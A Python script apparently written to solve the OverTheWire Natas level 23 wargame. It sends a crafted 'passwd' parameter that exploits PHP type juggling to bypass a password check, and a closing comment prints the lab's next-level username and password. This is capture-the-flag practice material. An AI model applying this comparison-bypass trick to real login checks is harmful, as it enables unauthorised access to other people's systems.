from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
    
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        

url = 'http://natas23.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas23','D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE')
my_cookies = {"PHPSESSID":''} #irrelevant for this one 
my_params = {"passwd":"99iloveyou"}

res, soup = make()
writeResponse()

'''
Another shockingly easy one. Seriously, the fucking password construction ones were way
harder than this. I guess it's supposed to teach you about type conversion in PHP?

Username: natas24 
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
'''